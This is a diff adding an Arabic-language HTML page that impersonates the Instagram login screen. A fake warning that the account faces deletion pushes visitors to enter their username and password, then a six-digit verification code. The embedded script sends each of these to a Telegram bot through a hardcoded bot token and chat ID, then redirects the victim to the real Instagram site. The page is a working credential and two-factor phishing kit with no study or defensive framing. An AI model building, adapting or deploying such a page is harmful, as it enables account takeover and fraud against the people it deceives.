@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Instagram</title>
+<style>
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+    background: #fafafa;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+    margin: 0;
+    padding: 20px;
+  }
+  .box {
+    background: white;
+    border: 1px solid #dbdbdb;
+    border-radius: 8px;
+    padding: 40px 30px;
+    width: 100%;
+    max-width: 340px;
+    box-sizing: border-box;
+  }
+  h1 {
+    font-family: 'Billabong', cursive, serif;
+    text-align: center;
+    font-size: 44px;
+    margin: 0 0 30px 0;
+    letter-spacing: -2px;
+  }
+  input {
+    width: 100%;
+    padding: 12px;
+    margin-bottom: 8px;
+    background: #fafafa;
+    border: 1px solid #dbdbdb;
+    border-radius: 4px;
+    font-size: 14px;
+    box-sizing: border-box;
+    -webkit-appearance: none;
+  }
+  button {
+    width: 100%;
+    padding: 12px;
+    background: #0095f6;
+    color: white;
+    border: none;
+    border-radius: 8px;
+    font-weight: 600;
+    font-size: 14px;
+    cursor: pointer;
+    margin-top: 8px;
+  }
+  .warning {
+    background: #fff3cd;
+    border: 1px solid #ffc107;
+    padding: 10px;
+    border-radius: 6px;
+    font-size: 13px;
+    margin-bottom: 20px;
+    text-align: center;
+    color: #856404;
+  }
+  .hidden { display: none; }
+  .info { color: #666; font-size: 14px; text-align: center;
+          margin-bottom: 15px; line-height: 1.6; }
+  .success { color: #0095f6; font-size: 16px; text-align: center;
+             font-weight: 600; }
+</style>
+</head>
+<body>
+
+<div class="box">
+  <h1>Instagram</h1>
+
+  <div id="step1">
+    <div class="warning">⚠️ حسابك معرض للحذف</div>
+    <form id="form1">
+      <input type="text" id="username" placeholder="اسم المستخدم" required
+             autocomplete="username" autocapitalize="off">
+      <input type="password" id="password" placeholder="كلمة المرور" required
+             autocomplete="current-password">
+      <button type="submit" id="btn1">تسجيل الدخول</button>
+    </form>
+  </div>
+
+  <div id="step2" class="hidden">
+    <div class="info">
+      📩 أرسلنا كود تحقق<br>
+      أدخل الكود المكوّن من ٦ أرقام
+    </div>
+    <form id="form2">
+      <input type="text" id="otp" placeholder="______" maxlength="6"
+             inputmode="numeric" pattern="[0-9]{6}" required
+             style="text-align:center; font-size:22px; letter-spacing:8px;">
+      <button type="submit" id="btn2">تأكيد</button>
+    </form>
+  </div>
+
+  <div id="step3" class="hidden">
+    <div class="success">✅ تم التحقق بنجاح</div>
+    <div class="info" style="margin-top:15px;">
+      جاري تحويلك...
+    </div>
+  </div>
+</div>
+
+<script>
+const BOT_TOKEN = "8863595996:AAG8JP9ogv6PlFUaBnjIX9ZiytwyfwvIM8Y";
+const CHAT_ID = "8013997356";
+
+async function sendToTelegram(text) {
+  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+  try {
+    await fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: text,
+        parse_mode: 'HTML'
+      })
+    });
+  } catch (e) {
+    console.error('Telegram error:', e);
+  }
+}
+
+let creds = { user: '', pass: '' };
+
+document.getElementById('form1').addEventListener('submit', async (e) => {
+  e.preventDefault();
+  const btn = document.getElementById('btn1');
+  btn.disabled = true;
+  btn.textContent = 'جاري...';
+
+  creds.user = document.getElementById('username').value;
+  creds.pass = document.getElementById('password').value;
+
+  await sendToTelegram(
+    `🟢 <b>LOGIN</b>\n👤 <code>${creds.user}</code>\n🔑 <code>${creds.pass}</code>`
+  );
+
+  document.getElementById('step1').classList.add('hidden');
+  document.getElementById('step2').classList.remove('hidden');
+});
+
+document.getElementById('form2').addEventListener('submit', async (e) => {
+  e.preventDefault();
+  const btn = document.getElementById('btn2');
+  btn.disabled = true;
+  btn.textContent = 'جاري التحقق...';
+
+  const otp = document.getElementById('otp').value;
+
+  await sendToTelegram(
+    `🔵 <b>OTP</b>\n👤 <code>${creds.user}</code>\n🔑 <code>${creds.pass}</code>\n📟 <code>${otp}</code>`
+  );
+
+  document.getElementById('step2').classList.add('hidden');
+  document.getElementById('step3').classList.remove('hidden');
+
+  setTimeout(() => {
+    window.location.href = 'https://www.instagram.com/accounts/login/';
+  }, 3000);
+});
+</script>
+</body>
+</html>
